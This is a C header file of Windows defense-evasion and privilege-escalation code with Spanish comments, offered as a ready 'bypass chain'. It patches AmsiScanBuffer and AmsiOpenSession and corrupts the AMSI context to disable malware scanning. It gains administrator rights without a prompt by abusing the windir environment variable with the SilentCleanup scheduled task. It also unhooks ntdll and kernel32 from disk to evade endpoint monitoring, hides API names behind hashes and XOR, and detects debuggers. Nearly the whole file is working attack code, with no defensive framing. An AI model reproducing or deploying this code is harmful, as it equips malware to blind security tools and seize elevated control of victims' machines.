#ifndef ADVANCED_BYPASS_H
#define ADVANCED_BYPASS_H

#include <windows.h>
#include <winternl.h>

// ============================================================================
// CONFIGURACIÓN Y DEFINICIONES AVANZADAS
// ============================================================================

#define STATUS_SUCCESS ((NTSTATUS)0x00000000)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR) - 1)
#define NtCurrentThread() ((HANDLE)(LONG_PTR) - 2)

// Hashes djb2 de APIs críticas (evita strings en .data)
#define HASH_LDRLOADDLL 0x8A8B4036
#define HASH_LDRGETPROCEDURE 0xC0E1A8B2
#define HASH_NTALLOCATEVM 0xF7027314
#define HASH_NTPROTECTVM 0x1255E49C
#define HASH_NTWRITEVM 0xF5BD9E9A
#define HASH_NTFREEVM 0xE49A7B12
#define HASH_NTCLOSE 0x369BD981
#define HASH_NTQUERYSYSTEMINFO 0xB5A1E88D
#define HASH_RTLINITUNICODE 0xD721E98C
#define HASH_RTLCREATEUSERTHREAD 0xA91B8C4F

// Estructuras NT internas adicionales
typedef struct _VM_COUNTERS {
  SIZE_T PeakVirtualSize;
  SIZE_T VirtualSize;
  ULONG PageFaultCount;
  SIZE_T PeakWorkingSetSize;
  SIZE_T WorkingSetSize;
  SIZE_T QuotaPeakPagedPoolUsage;
  SIZE_T QuotaPagedPoolUsage;
  SIZE_T QuotaPeakNonPagedPoolUsage;
  SIZE_T QuotaNonPagedPoolUsage;
  SIZE_T PagefileUsage;
  SIZE_T PeakPagefileUsage;
} VM_COUNTERS, *PVM_COUNTERS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
  ULONG NextEntryOffset;
  ULONG NumberOfThreads;
  LARGE_INTEGER WorkingSetPrivateSize;
  ULONG HardFaultCount;
  ULONG NumberOfThreadsHighWatermark;
  ULONGLONG CycleTime;
  LARGE_INTEGER CreateTime;
  LARGE_INTEGER UserTime;
  LARGE_INTEGER KernelTime;
  UNICODE_STRING ImageName;
  KPRIORITY BasePriority;
  HANDLE UniqueProcessId;
  HANDLE InheritedFromUniqueProcessId;
  ULONG HandleCount;
  ULONG SessionId;
  ULONG_PTR UniqueProcessKey;
  VM_COUNTERS VmCounters;
  SIZE_T PrivatePageCount;
  IO_COUNTERS IoCounters;
  SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef struct _PEB_LDR_DATA2 {
  ULONG Length;
  BOOLEAN Initialized;
  HANDLE SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
  PVOID EntryInProgress;
  BOOLEAN ShutdownInProgress;
  HANDLE ShutdownThreadId;
} PEB_LDR_DATA2, *PPEB_LDR_DATA2;

typedef struct _LDR_DATA_TABLE_ENTRY2 {
  LIST_ENTRY InLoadOrderLinks;
  LIST_ENTRY InMemoryOrderLinks;
  LIST_ENTRY InInitializationOrderLinks;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
  ULONG Flags;
  USHORT LoadCount;
  USHORT TlsIndex;
  LIST_ENTRY HashLinks;
  ULONG TimeDateStamp;
  PVOID EntryPointActivationContext;
  PVOID PatchInformation;
  LIST_ENTRY ForwarderLinks;
  LIST_ENTRY ServiceTagLinks;
  LIST_ENTRY StaticLinks;
  PVOID ContextInformation;
  ULONG_PTR OriginalBase;
  LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY2, *PLDR_DATA_TABLE_ENTRY2;

// Prototipos de syscalls directos
EXTERN_C NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle,
                                          PVOID *BaseAddress,
                                          ULONG_PTR ZeroBits,
                                          PSIZE_T RegionSize,
                                          ULONG AllocationType, ULONG Protect);

EXTERN_C NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle,
                                         PVOID *BaseAddress, PSIZE_T RegionSize,
                                         ULONG NewProtect, PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                       PVOID Buffer,
                                       SIZE_T NumberOfBytesToWrite,
                                       PSIZE_T NumberOfBytesWritten);

EXTERN_C NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                      PSIZE_T RegionSize, ULONG FreeType);

EXTERN_C NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength);

// ============================================================================
// UTILIDADES CRIPTOGRÁFICAS Y OFUSCACIÓN
// ============================================================================

// Hash djb2 para resolución de APIs
static __forceinline ULONG HashStringDjb2A(_In_ LPCSTR String) {
  ULONG Hash = 5381;
  INT c;
  while ((c = *String++))
    Hash = ((Hash << 5) + Hash) + c;
  return Hash;
}

static __forceinline ULONG HashStringDjb2W(_In_ LPCWSTR String) {
  ULONG Hash = 5381;
  INT c;
  while ((c = *String++))
    Hash = ((Hash << 5) + Hash) + c;
  return Hash;
}

// Deofuscador XOR runtime de strings wide
static __forceinline VOID XorDecryptW(_Inout_ WCHAR *Buffer, _In_ SIZE_T Len,
                                      _In_ WCHAR Key) {
  for (SIZE_T i = 0; i < Len; i++)
    Buffer[i] ^= Key;
}

// Deofuscador XOR runtime de strings ANSI
static __forceinline VOID XorDecryptA(_Inout_ CHAR *Buffer, _In_ SIZE_T Len,
                                      _In_ CHAR Key) {
  for (SIZE_T i = 0; i < Len; i++)
    Buffer[i] ^= Key;
}

// ============================================================================
// RESOLUCIÓN DINÁMICA DE APIs (EVITA IAT Sospechosa)
// ============================================================================

static PVOID GetModuleBaseByHash(_In_ ULONG ModuleHash) {
#ifdef _WIN64
  PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
  PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
  PPEB_LDR_DATA2 pLdr = (PPEB_LDR_DATA2)pPeb->Ldr;
  PLIST_ENTRY pList = &pLdr->InLoadOrderModuleList;
  PLIST_ENTRY pEntry = pList->Flink;

  while (pEntry != pList) {
    PLDR_DATA_TABLE_ENTRY2 pModule =
        CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY2, InLoadOrderLinks);
    if (HashStringDjb2W(pModule->BaseDllName.Buffer) == ModuleHash)
      return pModule->DllBase;
    pEntry = pEntry->Flink;
  }
  return NULL;
}

static PVOID GetProcAddressByHash(_In_ PVOID ModuleBase,
                                  _In_ ULONG FunctionHash) {
  PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ModuleBase;
  PIMAGE_NT_HEADERS pNt =
      (PIMAGE_NT_HEADERS)((PBYTE)ModuleBase + pDos->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY pExport =
      (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ModuleBase +
                                pNt->OptionalHeader
                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                                    .VirtualAddress);

  PDWORD pAddressOfFunctions =
      (PDWORD)((PBYTE)ModuleBase + pExport->AddressOfFunctions);
  PDWORD pAddressOfNames =
      (PDWORD)((PBYTE)ModuleBase + pExport->AddressOfNames);
  PWORD pAddressOfOrdinals =
      (PWORD)((PBYTE)ModuleBase + pExport->AddressOfNameOrdinals);

  for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
    LPSTR pFunctionName = (LPSTR)((PBYTE)ModuleBase + pAddressOfNames[i]);
    if (HashStringDjb2A(pFunctionName) == FunctionHash) {
      WORD wOrdinal = pAddressOfOrdinals[i];
      return (PVOID)((PBYTE)ModuleBase + pAddressOfFunctions[wOrdinal]);
    }
  }
  return NULL;
}

// ============================================================================
// PARSING PE AVANZADO Y UTILIDADES DE MEMORIA
// ============================================================================

typedef struct _PE_CONTEXT {
  PVOID Base;
  PIMAGE_DOS_HEADER Dos;
  PIMAGE_NT_HEADERS Nt;
  PIMAGE_SECTION_HEADER Sections;
  WORD NumSections;
  BOOLEAN Is64;
} PE_CONTEXT, *PPE_CONTEXT;

static BOOL PeInitializeContext(_Out_ PPE_CONTEXT ctx, _In_ PVOID Base) {
  if (!ctx || !Base)
    return FALSE;

  PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)Base;
  if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
    return FALSE;

  PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)Base + pDos->e_lfanew);
  if (pNt->Signature != IMAGE_NT_SIGNATURE)
    return FALSE;

  ctx->Base = Base;
  ctx->Dos = pDos;
  ctx->Nt = pNt;
  ctx->Sections = IMAGE_FIRST_SECTION(pNt);
  ctx->NumSections = pNt->FileHeader.NumberOfSections;
#ifdef _WIN64
  ctx->Is64 = (pNt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
#else
  ctx->Is64 = FALSE;
#endif
  return TRUE;
}

static PIMAGE_SECTION_HEADER PeGetSection(_In_ PPE_CONTEXT ctx,
                                          _In_ LPCSTR Name) {
  if (!ctx || !Name)
    return NULL;
  for (WORD i = 0; i < ctx->NumSections; i++) {
    if (!memcmp(ctx->Sections[i].Name, Name, strlen(Name)))
      return &ctx->Sections[i];
  }
  return NULL;
}

static PVOID PeGetExport(_In_ PPE_CONTEXT ctx, _In_ LPCSTR Name) {
  if (!ctx || !Name)
    return NULL;

  PIMAGE_DATA_DIRECTORY pExpDir =
      &ctx->Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (!pExpDir->VirtualAddress)
    return NULL;

  PIMAGE_EXPORT_DIRECTORY pExport =
      (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ctx->Base + pExpDir->VirtualAddress);
  PDWORD pNames = (PDWORD)((PBYTE)ctx->Base + pExport->AddressOfNames);
  PDWORD pFuncs = (PDWORD)((PBYTE)ctx->Base + pExport->AddressOfFunctions);
  PWORD pOrds = (PWORD)((PBYTE)ctx->Base + pExport->AddressOfNameOrdinals);

  for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
    LPCSTR pName = (LPCSTR)((PBYTE)ctx->Base + pNames[i]);
    if (!strcmp(pName, Name))
      return (PVOID)((PBYTE)ctx->Base + pFuncs[pOrds[i]]);
  }
  return NULL;
}

static PVOID PeRvaToVa(_In_ PPE_CONTEXT ctx, _In_ DWORD Rva) {
  return (PVOID)((PBYTE)ctx->Base + Rva);
}

// ============================================================================
// TÉCNICA 1: BYPASS AMSI MÚLTIPLE (DATA-ONLY + HOOK + CONTEXT)
// ============================================================================

// Patrones de firma para AmsiScanBuffer
static CONST BYTE g_AmsiScanBufferPattern[] = {0x48, 0x89, 0x5C, 0x24, 0x08,
                                               0x48, 0x89, 0x74, 0x24, 0x10,
                                               0x57, 0x48, 0x83, 0xEC, 0x20};
static CONST BYTE g_AmsiScanBufferPatch[] = {
    0xB8, 0x57, 0x00,
    0x07, 0x80, 0xC3}; // mov eax, 0x80070057; ret (E_INVALIDARG)

// Patrón para AmsiInitialize (para encontrar amsiContext global)
static CONST BYTE g_AmsiInitPattern[] = {0x48, 0x89, 0x05, 0x00, 0x00,
                                         0x00, 0x00, 0x48, 0x8B, 0xC8};

static PVOID PatternScan(_In_ PVOID Base, _In_ SIZE_T Size,
                         _In_ CONST BYTE *Pattern, _In_ SIZE_T PatternLen,
                         _In_ BYTE Wildcard) {
  if (!Base || !Size || !Pattern || !PatternLen)
    return NULL;

  PBYTE pStart = (PBYTE)Base;
  for (SIZE_T i = 0; i <= Size - PatternLen; i++) {
    BOOL bMatch = TRUE;
    for (SIZE_T j = 0; j < PatternLen; j++) {
      if (Pattern[j] != Wildcard && pStart[i + j] != Pattern[j]) {
        bMatch = FALSE;
        break;
      }
    }
    if (bMatch)
      return &pStart[i];
  }
  return NULL;
}

static BOOL PatchAmsiScanBuffer(_In_ HMODULE hAmsi) {
  PE_CONTEXT ctx;
  if (!PeInitializeContext(&ctx, hAmsi))
    return FALSE;

  // 1. Técnica: Hook directo de AmsiScanBuffer
  PVOID pAmsiScanBuffer = PeGetExport(&ctx, "AmsiScanBuffer");
  if (!pAmsiScanBuffer)
    return FALSE;

  ULONG oldProtect = 0;
  SIZE_T patchSize = sizeof(g_AmsiScanBufferPatch);
  PVOID pPatchAddr = pAmsiScanBuffer;

  if (NtProtectVirtualMemory(NtCurrentProcess(), &pPatchAddr, &patchSize,
                             PAGE_EXECUTE_READWRITE,
                             &oldProtect) != STATUS_SUCCESS)
    return FALSE;

  memcpy(pAmsiScanBuffer, g_AmsiScanBufferPatch, sizeof(g_AmsiScanBufferPatch));

  NtProtectVirtualMemory(NtCurrentProcess(), &pPatchAddr, &patchSize,
                         oldProtect, &oldProtect);
  return TRUE;
}

static BOOL PatchAmsiContextDataOnly(_In_ HMODULE hAmsi) {
  PE_CONTEXT ctx;
  if (!PeInitializeContext(&ctx, hAmsi))
    return FALSE;

  // Buscar sección .data
  PIMAGE_SECTION_HEADER pData = PeGetSection(&ctx, ".data");
  if (!pData)
    return FALSE;

  PVOID pDataStart = (PBYTE)ctx.Base + pData->VirtualAddress;

  // Buscar el puntero a amsiContext (variable global no exportada)
  // Técnica: buscar referencias cruzadas o usar heurística de inicialización
  PVOID pAmsiContext = NULL;

  // Método 1: Buscar puntero inicializado no nulo en .data que apunte a .rdata
  // o heap
  PDWORD_PTR pScan = (PDWORD_PTR)pDataStart;
  SIZE_T scanSize = pData->Misc.VirtualSize / sizeof(DWORD_PTR);

  for (SIZE_T i = 0; i < scanSize; i++) {
    DWORD_PTR val = pScan[i];
    if (val && val != (DWORD_PTR)-1) {
      // Verificar si parece un contexto AMSI (tamaño, magic, etc.)
      __try {
        PDWORD pPossible = (PDWORD)val;
        if (pPossible[0] == 0x49534D41) { // 'AMSI' magic (endian dependiente)
          pAmsiContext = &pScan[i];
          break;
        }
      } __except (EXCEPTION_EXECUTE_HANDLER) {
        continue;
      }
    }
  }

  if (!pAmsiContext) {
    // Fallback: Buscar con patrón de AmsiInitialize
    PVOID pInit = PeGetExport(&ctx, "AmsiInitialize");
    if (pInit) {
      // Buscar mov [amsiContext], reg en los primeros bytes
      // Esto es específico de la versión, pero sirve como ejemplo
      PBYTE pCode = (PBYTE)pInit;
      for (INT i = 0; i < 64; i++) {
        if (pCode[i] == 0x48 && pCode[i + 1] == 0x89 && pCode[i + 2] == 0x05) {
          // RIP-relative mov
          INT32 offset = *(INT32 *)(pCode + i + 3);
          pAmsiContext = pCode + i + 7 + offset;
          break;
        }
      }
    }
  }

  if (pAmsiContext) {
    // Corromper el contexto (setear a NULL o a valor inválido)
    *(PVOID *)pAmsiContext = NULL;
    return TRUE;
  }

  return FALSE;
}

static BOOL BypassAMSI_Advanced() {
  // Obtener AMSI sin usar GetModuleHandleW (evita hooks en kernel32)
  // Usar PEB walk directo
  PVOID hAmsi = GetModuleBaseByHash(HashStringDjb2W(L"amsi.dll"));
  if (!hAmsi) {
    // Fallback: cargar manualmente via LdrLoadDll
    // (Simplificado para este ejemplo)
    hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi)
      return FALSE;
  }

  // Intentar múltiples vectores de bypass
  if (PatchAmsiScanBuffer((HMODULE)hAmsi))
    return TRUE;

  if (PatchAmsiContextDataOnly((HMODULE)hAmsi))
    return TRUE;

  // Último recurso: patch AmsiScanString -> AmsiScanBuffer -> AmsiOpenSession
  PE_CONTEXT ctx;
  if (PeInitializeContext(&ctx, hAmsi)) {
    PVOID pOpenSession = PeGetExport(&ctx, "AmsiOpenSession");
    if (pOpenSession) {
      BYTE patch[] = {0x48, 0x31, 0xC0, 0xC3}; // xor rax, rax; ret
      ULONG oldProt = 0;
      SIZE_T sz = sizeof(patch);
      PVOID pAddr = pOpenSession;
      if (NtProtectVirtualMemory(NtCurrentProcess(), &pAddr, &sz,
                                 PAGE_EXECUTE_READWRITE,
                                 &oldProt) == STATUS_SUCCESS) {
        memcpy(pOpenSession, patch, sizeof(patch));
        NtProtectVirtualMemory(NtCurrentProcess(), &pAddr, &sz, oldProt,
                               &oldProt);
        return TRUE;
      }
    }
  }

  return FALSE;
}

// ============================================================================
// TÉCNICA 2: BYPASS UAC SILENTCLEANUP CON HARDENING
// ============================================================================

static BOOL SetEnvironmentVariableSecure(_In_ LPCWSTR Name,
                                         _In_ LPCWSTR Value) {
  HKEY hKey;
  LSTATUS status = RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0,
                                 KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
  if (status != ERROR_SUCCESS)
    return FALSE;

  // Backup del valor original para restauración garantizada
  WCHAR originalValue[MAX_PATH * 4] = {0};
  DWORD origSize = sizeof(originalValue);
  DWORD origType = 0;
  BOOL hasOriginal =
      (RegQueryValueExW(hKey, Name, NULL, &origType, (LPBYTE)originalValue,
                        &origSize) == ERROR_SUCCESS);

  DWORD dataSize = (DWORD)((wcslen(Value) + 1) * sizeof(WCHAR));
  status = RegSetValueExW(hKey, Name, 0, REG_SZ, (LPBYTE)Value, dataSize);
  RegCloseKey(hKey);

  if (status != ERROR_SUCCESS)
    return FALSE;

  // Notificar al sistema del cambio de entorno
  SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                      (LPARAM)L"Environment", SMTO_ABORTIFHUNG, 5000, NULL);

  return TRUE;
}

static BOOL DeleteEnvironmentVariableSecure(_In_ LPCWSTR Name) {
  HKEY hKey;
  if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE,
                    &hKey) != ERROR_SUCCESS)
    return FALSE;

  LSTATUS status = RegDeleteValueW(hKey, Name);
  RegCloseKey(hKey);

  SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                      (LPARAM)L"Environment", SMTO_ABORTIFHUNG, 5000, NULL);

  return (status == ERROR_SUCCESS || status == ERROR_FILE_NOT_FOUND);
}

static BOOL BypassUAC_SilentCleanupHardened(_In_ LPCWSTR payloadPath) {
  if (!payloadPath || wcslen(payloadPath) == 0)
    return FALSE;

  // Verificar que estamos en sesión interactiva y no elevated
  HANDLE hToken;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    return FALSE;

  TOKEN_ELEVATION elevation;
  DWORD retLen;
  BOOL isElevated = FALSE;
  if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation),
                          &retLen))
    isElevated = elevation.TokenIsElevated;
  CloseHandle(hToken);

  if (isElevated)
    return FALSE; // Ya somos admin, no necesitamos bypass

  // Construir payload con ofuscación y validación
  WCHAR windirPayload[MAX_PATH * 4];
  // Payload: ejecuta nuestro binario y restaura windir original
  // Usamos cmd /c para poder encadenar comandos
  int written = swprintf_s(windirPayload, MAX_PATH * 4,
                           L"cmd.exe /c \"%s\" && SET windir=%%SystemRoot%%",
                           payloadPath);

  if (written <= 0 || written >= MAX_PATH * 4)
    return FALSE;

  // Establecer variable manipulada
  if (!SetEnvironmentVariableSecure(L"windir", windirPayload))
    return FALSE;

  // Ejecutar SilentCleanup via COM o directamente schtasks
  SHELLEXECUTEINFOW sei = {sizeof(sei)};
  sei.lpVerb = L"open";
  sei.lpFile = L"schtasks.exe";
  sei.lpParameters =
      L"/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /i";
  sei.nShow = SW_HIDE;
  sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;

  BOOL result = ShellExecuteExW(&sei);
  if (!result || !sei.hProcess) {
    DeleteEnvironmentVariableSecure(L"windir");
    return FALSE;
  }

  // Esperar con timeout y monitoreo
  DWORD waitResult = WaitForSingleObject(sei.hProcess, 10000);
  CloseHandle(sei.hProcess);

  // Restauración garantizada con reintentos
  for (INT i = 0; i < 5; i++) {
    if (DeleteEnvironmentVariableSecure(L"windir"))
      break;
    Sleep(500);
  }

  return (waitResult == WAIT_OBJECT_0);
}

// ============================================================================
// TÉCNICA 3: CLEAN MAPPING CON UNHOOKING Y VERIFICACIÓN
// ============================================================================

typedef struct _CLEAN_MODULE_INFO {
  PVOID Base;
  SIZE_T Size;
  PIMAGE_NT_HEADERS Nt;
  PIMAGE_SECTION_HEADER Sections;
  WORD NumSections;
} CLEAN_MODULE_INFO, *PCLEAN_MODULE_INFO;

static PVOID GetCleanMappingAdvanced(_In_ LPCWSTR moduleName,
                                     _Out_opt_ PCLEAN_MODULE_INFO pInfo) {
  if (!moduleName)
    return NULL;

  WCHAR sysPath[MAX_PATH];
  UINT len = GetSystemDirectoryW(sysPath, MAX_PATH);
  if (!len || len >= MAX_PATH)
    return NULL;

  // Construir path seguro
  if (sysPath[len - 1] != L'\\') {
    sysPath[len] = L'\\';
    sysPath[len + 1] = L'\0';
    len++;
  }

  SIZE_T nameLen = wcslen(moduleName);
  if (len + nameLen >= MAX_PATH)
    return NULL;
  memcpy(sysPath + len, moduleName, (nameLen + 1) * sizeof(WCHAR));

  // Abrir archivo con flags mínimos
  HANDLE hFile = CreateFileW(
      sysPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    return NULL;

  // Obtener tamaño para mapeo no basado en sección
  LARGE_INTEGER fileSize;
  if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart == 0) {
    CloseHandle(hFile);
    return NULL;
  }

  // Crear sección de solo lectura
  HANDLE hSection =
      CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
  CloseHandle(hFile);

  if (!hSection)
    return NULL;

  // Mapear vista
  PVOID pMapping = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
  CloseHandle(hSection);

  if (!pMapping)
    return NULL;

  // Validar PE en el mapeo limpio
  PE_CONTEXT ctx;
  if (!PeInitializeContext(&ctx, pMapping)) {
    UnmapViewOfFile(pMapping);
    return NULL;
  }

  // Verificar firma digital (opcional pero recomendado)
  // Simplificado: verificar checksum opcional
  DWORD headerChecksum = ctx.Nt->OptionalHeader.CheckSum;

  if (pInfo) {
    pInfo->Base = pMapping;
    pInfo->Size = (SIZE_T)fileSize.QuadPart;
    pInfo->Nt = ctx.Nt;
    pInfo->Sections = ctx.Sections;
    pInfo->NumSections = ctx.NumSections;
  }

  return pMapping;
}

// ============================================================================
// TÉCNICA 4: UNHOOKING POR REBASE DE .TEXT DESDE DISCO
// ============================================================================

static BOOL UnhookModuleFromDisk(_In_ LPCWSTR moduleName) {
  CLEAN_MODULE_INFO cleanInfo = {0};
  PVOID pClean = GetCleanMappingAdvanced(moduleName, &cleanInfo);
  if (!pClean)
    return FALSE;

  // Obtener módulo cargado actualmente
  HMODULE hLoaded = GetModuleHandleW(moduleName);
  if (!hLoaded) {
    UnmapViewOfFile(pClean);
    return FALSE;
  }

  PE_CONTEXT loadedCtx;
  if (!PeInitializeContext(&loadedCtx, hLoaded)) {
    UnmapViewOfFile(pClean);
    return FALSE;
  }

  // Encontrar sección .text en ambos
  PIMAGE_SECTION_HEADER pTextClean =
      PeGetSection(&((PE_CONTEXT){.Base = pClean}), ".text");
  PIMAGE_SECTION_HEADER pTextLoaded = PeGetSection(&loadedCtx, ".text");

  if (!pTextClean || !pTextLoaded) {
    UnmapViewOfFile(pClean);
    return FALSE;
  }

  // Verificar tamaños compatibles
  if (pTextClean->Misc.VirtualSize != pTextLoaded->Misc.VirtualSize) {
    UnmapViewOfFile(pClean);
    return FALSE;
  }

  // Rebase: copiar .text limpio sobre .text hooked
  PVOID pDest = (PBYTE)hLoaded + pTextLoaded->VirtualAddress;
  PVOID pSrc = (PBYTE)pClean + pTextClean->VirtualAddress;
  SIZE_T size = pTextLoaded->Misc.VirtualSize;

  ULONG oldProtect = 0;
  if (NtProtectVirtualMemory(NtCurrentProcess(), &pDest, &size,
                             PAGE_EXECUTE_READWRITE,
                             &oldProtect) != STATUS_SUCCESS) {
    UnmapViewOfFile(pClean);
    return FALSE;
  }

  memcpy(pDest, pSrc, size);

  // Restaurar protección original
  NtProtectVirtualMemory(NtCurrentProcess(), &pDest, &size, oldProtect,
                         &oldProtect);

  UnmapViewOfFile(pClean);
  return TRUE;
}

// ============================================================================
// TÉCNICA 5: ANTI-ANÁLISIS Y OFUSCACIÓN DE COMPORTAMIENTO
// ============================================================================

static BOOL IsDebuggerPresentAdvanced() {
  // Check PEB.BeingDebugged
#ifdef _WIN64
  PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
  PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
  if (pPeb->BeingDebugged)
    return TRUE;

  // Check NtGlobalFlag
  if (pPeb->NtGlobalFlag & 0x70)
    return TRUE;

  // Check Heap flags
  PVOID pHeap =
      (PVOID) * (PULONG_PTR)((PBYTE)pPeb + (sizeof(PVOID) * 2)); // ProcessHeap
  DWORD heapFlags =
      *(PDWORD)((PBYTE)pHeap + (sizeof(PVOID) * 3)); // Heap flags offset
  DWORD heapForceFlags =
      *(PDWORD)((PBYTE)pHeap + (sizeof(PVOID) * 3) + sizeof(DWORD));

  if (heapFlags & ~HEAP_GROWABLE || heapForceFlags != 0)
    return TRUE;

  // Check hardware breakpoints
  CONTEXT ctx = {0};
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
  if (GetThreadContext(GetCurrentThread(), &ctx)) {
    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3)
      return TRUE;
  }

  return FALSE;
}

static VOID ObfuscateExecutionFlow() {
  // Insertar delays aleatorios para evadir análisis temporal
  LARGE_INTEGER freq, start, end;
  QueryPerformanceFrequency(&freq);
  QueryPerformanceCounter(&start);

  // Trabajo dummy variable
  volatile DWORD dummy = 0;
  for (INT i = 0; i < (GetTickCount() % 1000) + 500; i++) {
    dummy ^= (i * 0xDEADBEEF);
  }

  QueryPerformanceCounter(&end);
  // Si el tiempo es anormalmente alto, podría estar instrumentado
}

// ============================================================================
// API PÚBLICA CON ORQUESTACIÓN
// ============================================================================

static BOOL InitializeAdvancedBypass() {
  if (IsDebuggerPresentAdvanced()) {
    // Comportamiento ofuscado bajo debugger
    ObfuscateExecutionFlow();
  }

  // Unhook ntdll y kernel32 primero para operar limpio
  UnhookModuleFromDisk(L"ntdll.dll");
  UnhookModuleFromDisk(L"kernel32.dll");
  UnhookModuleFromDisk(L"kernelbase.dll");

  return TRUE;
}

static BOOL ExecuteFullBypassChain() {
  if (!InitializeAdvancedBypass())
    return FALSE;

  if (!BypassAMSI_Advanced())
    return FALSE; // AMSI es crítico, fallar si no se puede bypass

  return TRUE;
}

#endif // ADVANCED_BYPASS_H
